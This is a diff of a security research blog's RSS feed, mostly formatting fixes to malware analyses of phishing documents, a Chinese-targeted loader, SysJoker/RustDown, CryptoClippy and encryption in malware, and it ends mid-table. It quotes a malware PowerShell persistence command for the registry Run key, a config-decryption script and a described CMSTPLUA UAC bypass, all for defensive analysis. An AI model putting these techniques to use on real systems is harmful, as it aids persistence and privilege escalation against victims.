 &lt;p&gt;The phishing emails delivering these &lt;code&gt;.docx&lt;/code&gt; files successfully bypassed
 multiple email security filters and landed in user inboxes undetected.&lt;/p&gt;
 &lt;h3&gt;How OpenXML Documents Work&lt;span class="hx:absolute hx:-mt-20" id="how-openxml-documents-work"&gt;&lt;/span&gt;
@@ -3916,6 +3926,7 @@ bypassed traditional email scanners and static link analysis tools.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;We’ve conducted this analysis using a custom tool we developed. It extracts all
 the MHT files inside and decodes the QR code. The image below shows the output:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig13.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Findings&lt;span class="hx:absolute hx:-mt-20" id="findings-3"&gt;&lt;/span&gt;
 &lt;a href="#findings-3" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;After using the tool we developed to conduct our analysis, we found that:&lt;/p&gt;
 &lt;ul&gt;
@@ -3987,7 +3998,7 @@ research collaboration, we can stay ahead of threats designed to go unnoticed.&l
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Weaponized Software Targets Chinese</title><link>https://research.intezer.com/blog/2025/01/weaponized-software-targets-chinese/</link><pubDate>Thu, 16 Jan 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/01/weaponized-software-targets-chinese/</guid><description>
+&lt;/div&gt;</description></item><item><title>Threat Bulletin: Weaponized Software Targets Chinese-Speaking Organizations</title><link>https://research.intezer.com/blog/2025/01/weaponized-software-targets-chinese/</link><pubDate>Thu, 16 Jan 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/01/weaponized-software-targets-chinese/</guid><description>
 &lt;h2&gt;Overview of the Attack&lt;span class="hx:absolute hx:-mt-20" id="overview-of-the-attack"&gt;&lt;/span&gt;
 &lt;a href="#overview-of-the-attack" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Intezer Labs research team has identified a series of attacks targeting
 organizations in Chinese-speaking regions like Hong Kong, Taiwan, and China
@@ -4024,7 +4035,7 @@ for malware execution via the following steps:&lt;/p&gt;
 &lt;li&gt;Command-line Argument Parsing:
 &lt;ul&gt;
 &lt;li&gt;If the &lt;code&gt;/aut&lt;/code&gt; argument is present, the loader decrypts the registry path
-&lt;code&gt;Software\\DICKEXEPATH&lt;/code&gt; using XOR encryption and writes the down.exe path
+&lt;code&gt;Software\DICKEXEPATH&lt;/code&gt; using XOR encryption and writes the down.exe path
 to the registry (&lt;code&gt;HKEY_CURRENT_USER\Software\DICKEXEPATH&lt;/code&gt;). The loader then
 uses the
 &lt;a href="https://github.com/hasherezade/pe_to_shellcode/tree/a2458c96619b721677af0f9b906cd6a229364b4c"target="_blank" rel="noopener"&gt;pe_to_shellcode&lt;/a&gt;
@@ -4892,7 +4903,8 @@ operations.&lt;/p&gt;
 &lt;th&gt;Packet&lt;/th&gt;
 &lt;th&gt;Offset (Bytes)&lt;/th&gt;
 &lt;th&gt;Size (Bytes)&lt;/th&gt;
-&lt;th&gt;Field Description&lt;/th&gt;
+&lt;th&gt;Field&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
@@ -4901,22 +4913,26 @@ operations.&lt;/p&gt;
 &lt;td&gt;0-3&lt;/td&gt;
 &lt;td&gt;4&lt;/td&gt;
 &lt;td&gt;Packet size&lt;/td&gt;
+&lt;td&gt;Specifies the size of the packet.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;/td&gt;
 &lt;td&gt;4-7&lt;/td&gt;
 &lt;td&gt;4&lt;/td&gt;
 &lt;td&gt;ID&lt;/td&gt;
+&lt;td&gt;Identifies the operation or response.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;/td&gt;
 &lt;td&gt;8-11&lt;/td&gt;
 &lt;td&gt;4&lt;/td&gt;
 &lt;td&gt;Checksum&lt;/td&gt;
+&lt;td&gt;Validates the integrity of the header data.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Data&lt;/td&gt;
 &lt;td&gt;12+&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
 &lt;td&gt;Command parameters&lt;/td&gt;
 &lt;td&gt;Contains the actual data or payload.&lt;/td&gt;
 &lt;/tr&gt;
@@ -5365,7 +5381,7 @@ three possible options:&lt;/p&gt;
 &lt;li&gt;&lt;strong&gt;Load configuration from the Registry and execute (executionType = 2)&lt;/strong&gt;: The
 function checks if the module is in memory. If not, it loads it again and
 retrieves additional data from
-HKEY_LOCAL_MACHINESoftwareMicrosoftIMEEX&lt;moduleID&gt;P, invoking the &amp;ldquo;Execute&amp;rdquo;
+&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\IMEEX\&amp;lt;moduleID&amp;gt;\P&lt;/code&gt;, invoking the &amp;ldquo;Execute&amp;rdquo;
 function. If successful, the module&amp;rsquo;s execution state is updated to prevent
 re-execution.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Load and execute with predefined values (executionType = 3)&lt;/strong&gt;: Similar to
@@ -5685,7 +5701,7 @@ comprehensive Djibouti implementation.&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Decrypt the data&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;data_buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;107&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# XOR the first byte with 0xF0 as part of the decryption&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="mh"&gt;0xF0&lt;/span&gt;
@@ -5699,7 +5715,7 @@ comprehensive Djibouti implementation.&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unpack_from&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Decrypted string starts at offset 8&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;decrypted_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;x00′).decode(&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;latin1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;decrypted_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;x00&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;latin1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Decrypt the string using XOR with 0xE6&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;decrypted_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mh"&gt;0xE6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;decrypted_string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -6011,7 +6027,7 @@ data-copied-label="Copied!"
 codebase is new, the malware consistently shares TTPs used by the WildCard
 threat actor in both SysJoker and its variants. The name of the malware is
 derived from the developers, as evidenced by a leftover PDB path:&lt;/p&gt;
-&lt;p&gt;– &lt;code&gt;C:\Code\Rust\Rust\Down-Belal\target\release\deps\RustDown.pdb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;– &lt;code&gt;C:\Code\Rust\RustDown-Belal\target\release\deps\RustDown.pdb&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2023/11/wildcard-evolution-of-sysjoker-cyber-threat/images/fig5.png" title="RustDown PDB file path." alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;RustDown PDB file path.&lt;/figcaption&gt;
@@ -6194,7 +6210,7 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;p&gt;The response is encoded using Base64 and XOR-ed with the same key that was used
 in the previous step. The decrypted result is the IP address of the C2:
-&lt;code&gt;{&amp;quot;url&amp;quot;:&amp;quot;http://85.31.231[.]49:443″}&lt;/code&gt;. During our investigation, we did not
+&lt;code&gt;{&amp;quot;url&amp;quot;:&amp;quot;http://85.31.231[.]49:443&amp;quot;}&lt;/code&gt;. During our investigation, we did not
 find other C2 domains that were served by this OneDrive link.&lt;/p&gt;
 &lt;p&gt;Next, the malware communicates with the C2 using the HTTP protocol. The URL is
 formatted in the following way: &lt;code&gt;&amp;lt;C2 domain&amp;gt;/api/&amp;lt;command&amp;gt;&lt;/code&gt;. In RustDown, we
@@ -6256,7 +6272,7 @@ latter was an attack that targeted the Israeli Electric Corporation (IEC) in
 2016-2017. In both cases, the following specific string is deobfuscated during
 execution and used to establish persistence.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;powershell&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34; -Command \&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$reg&lt;/span&gt;&lt;span class="p"&gt;=[&lt;/span&gt;&lt;span class="no"&gt;WMIClass&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ROOT\\DEFAULT:StdRegProv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$results&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$reg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="py"&gt;SetStringValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;amp;H80000001&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Software\\Microsoft\\Windows\\CurrentVersion\\Run&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;process&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;,&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;powershell&amp;#34;&lt;/span&gt; &lt;span class="n"&gt;-Command&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$reg&lt;/span&gt;&lt;span class="s2"&gt;=[WMIClass]&amp;#39;ROOT\DEFAULT:StdRegProv&amp;#39;;&lt;/span&gt;&lt;span class="nv"&gt;$results&lt;/span&gt;&lt;span class="s2"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$reg&lt;/span&gt;&lt;span class="s2"&gt;.SetStringValue(&amp;#39;&amp;amp;H80000001&amp;#39;,&amp;#39;Software\Microsoft\Windows\CurrentVersion\Run&amp;#39;, &amp;lt;process&amp;gt;, &amp;lt;path&amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -6418,9 +6434,10 @@ analysis. With the messages being decrypted, this uncovered a
 Mary, along with her co-conspirators, was executed! Think of the consequences
 the next time you decide to use a weak cipher for your secret messages!&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig1.jpg" title="Part of the cipher used by Mary, Queen of Scots (https://www.nationalarchives.gov.uk/education/resources/elizabeth-monarchy/ciphers-used-by-mary-queen-of-scots/)" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Part of the cipher used by Mary, Queen of Scots (https://www.nationalarchives.gov.uk/education/resources/elizabeth-monarchy/ciphers-used-by-mary-queen-of-scots/)&lt;/figcaption&gt;
+&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig1.jpg" title="Part of the cipher used by Mary, Queen of Scots" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Part of the cipher used by Mary, Queen of Scots&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Source: &lt;a href="https://www.nationalarchives.gov.uk/education/resources/elizabeth-monarchy/ciphers-used-by-mary-queen-of-scots/"target="_blank" rel="noopener"&gt;The National Archives&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;Fast forwarding to the modern era, with the development of technology, the
 complexity and speed of encryption have exploded. The information age has
 allowed encryption to be handled at the speed of computers. In the following
@@ -6749,7 +6766,7 @@ researchers quickly identify known malicious behaviors in a sample. As seen in
 the screenshot below, when running CAPA for the Vermilion Strike sample, it
 identifies the implementation of RSA and XOR encryption. It provides the
 addresses of the relevant functions.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig18.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig15.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;Having said that, CAPA is not a magic bullet, and in some cases, it might fail
 to detect certain behaviors due to unorthodox techniques implemented by threat
 actors or novel and non-conventional implementations of certain methods. In
@@ -6763,7 +6780,7 @@ loading values from the stack (as can be seen in the screenshot below). These
 operations often indicate encryption-related transformations and can provide
 crucial insights into how the malware encrypts and manipulates data.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig15.png" title="Implementation of encryption using boolean algebra operations." alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig16.png" title="Implementation of encryption using boolean algebra operations." alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Implementation of encryption using boolean algebra operations.&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;h4&gt;RC4&lt;span class="hx:absolute hx:-mt-20" id="rc4"&gt;&lt;/span&gt;
@@ -6799,7 +6816,7 @@ data-copied-label="Copied!"
 &lt;a href="../../../2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data"&gt;CryptoClippy&lt;/a&gt;
 malware, we can identify the two loops that are part of the KSA algorithm as
 described above.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig16.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig17.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h4&gt;ChaCha20&lt;span class="hx:absolute hx:-mt-20" id="chacha20"&gt;&lt;/span&gt;
 &lt;a href="#chacha20" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In the key setup stage of the ChaCha20 encryption algorithm, a
 &lt;a href="https://xilinx.github.io/Vitis_Libraries/security/2019.2/guide_L1/internals/chacha20.html"target="_blank" rel="noopener"&gt;fixed constant&lt;/a&gt;
@@ -6815,7 +6832,7 @@ ChaCha20 encryption. Below is the constant string in StageClient, along with
 the beginning of the initialization state, with the
 &lt;a href="https://github.com/shiffthq/chacha20/blob/master/src/chacha20.c"target="_blank" rel="noopener"&gt;source code&lt;/a&gt;
 for comparison.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig17.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2023/08/unraveling-malware-encryption-secrets/images/fig18.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;The following Yara rule can be used to check for the likely use of ChaCha20
 using the constant string.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
@@ -7067,7 +7084,7 @@ script. The data seen above satisfies the checks on the server side, and we
 obtained the payload for the 2nd stage of the attack.&lt;/p&gt;
 &lt;p&gt;The response contains 5 parts: 3 scripts, a loader, and a configuration file –
 as described by Unit 42. We noticed that in the first stage of the attack, a
-directory was created in AppDataRoaming, and the directory’s name changed based
+directory was created in &lt;code&gt;AppData\Roaming&lt;/code&gt;, and the directory’s name changed based
 on the response from the C2. We spotted the names Reposita or Flexizen, which
 is also the name of 3 of the scripts used in the first stage of the attack.&lt;/p&gt;
 &lt;p&gt;One of the PowerShell scripts (Reposita.ps) decodes the loader of the 2nd stage
@@ -7114,7 +7131,7 @@ the correct minor version is defined in the
 From this check, we understand that the malware targets Windows versions
 starting from Vista and above.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data/images/fig7.png" title="Source: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoa" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data/images/fig8.png" title="Source: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoa" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Source: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoa&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;h2&gt;Updates to the CryptoClippy Malware&lt;span class="hx:absolute hx:-mt-20" id="updates-to-the-cryptoclippy-malware"&gt;&lt;/span&gt;
@@ -7174,7 +7191,7 @@ effectively redirect all payments to their designated account.&lt;/p&gt;
 name, Windows version, and firmware information (using
 &lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemfirmwaretable"target="_blank" rel="noopener"&gt;GetSystemFirmwareTable&lt;/a&gt;).
 It queries the value ‘RSMB’ repressing the SMBIOS firmware table provider. Then
-it opens the registry key &lt;code&gt;SOFTWARE\\GbPlugin\\Uni&lt;/code&gt; and gets the value of
+it opens the registry key &lt;code&gt;SOFTWARE\GbPlugin\Uni&lt;/code&gt; and gets the value of
 &lt;code&gt;gFaYEcJ9U3dI&lt;/code&gt; and &lt;code&gt;gFaYEcJ9U3RB&lt;/code&gt;. The key is created by a plugin called
 &lt;code&gt;gbplugin&lt;/code&gt; whose purpose is to secure the connection to internet banking
 services. It is not clear what sort of information is stored in these registry
@@ -7183,7 +7200,7 @@ the C2.&lt;/p&gt;
 &lt;h3&gt;Persistence&lt;span class="hx:absolute hx:-mt-20" id="persistence"&gt;&lt;/span&gt;
 &lt;a href="#persistence" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As reported, the malware sets persistence on the victim machine by creating an
 LNK at
-&lt;code&gt;AppData\Roaming\Microsoft\Windows\Start\ Menu\Programs\Startup\Reposita.lnk&lt;/code&gt;.&lt;/p&gt;
+&lt;code&gt;AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Reposita.lnk&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;We identified a unique way in which the malware creates the LNK file. It calls
 the
 &lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance"target="_blank" rel="noopener"&gt;CoCreateInstance&lt;/a&gt;
@@ -7214,7 +7231,7 @@ security policy by checking the registry value at
 one of the following: EnableLUA, ConsentPromptBehaviorAdmin, or
 ConsentPromptBehaviorUser – the trojan will not execute the script at all. If
 none of these values are set, it checks the value of
-&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_elevation_type_"target="_blank" rel="noopener"&gt;TOKEN_ELEVATION_TYPE&lt;/a&gt;
+&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_elevation_type"target="_blank" rel="noopener"&gt;TOKEN_ELEVATION_TYPE&lt;/a&gt;
 to examine the token type. If the value is TokenElevationTypeLimited (numerical
 value 3), it will use the CMSTPLUA COM &lt;code&gt;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&lt;/code&gt;
 interface to bypass UAC and execute the script with elevated permissions. This
@@ -7235,7 +7252,7 @@ established, it sets the userAuthentication to 0 -which specifies that
 Network-Level user authentication is not required before the remote desktop
 connection is established. Lastly, using a user name passed as an argument to
 the script, the script creates a new user account and appends it to:
-&lt;code&gt;HKLM\SOFTWAREM\icrosoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&lt;/code&gt;
+&lt;code&gt;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&lt;/code&gt;
 to hide it from winlogon.&lt;/p&gt;
 &lt;p&gt;The script also sends information about the endpoint to the C2. The data
 contains the OS version, computer name, architecture, and indicators on
@@ -7542,8 +7559,8 @@ discreet than a malware containing the works of Shakespeare inside it?&lt;/p&gt;
 &lt;td&gt;Has the same negative effects of inflating the binary size&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Can cause decompilers and disassemblers to take a very long time to open the file – Less likely to defeat automated analysis techniques&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;Can cause decompilers and disassemblers to take a very long time to open the file&lt;/td&gt;
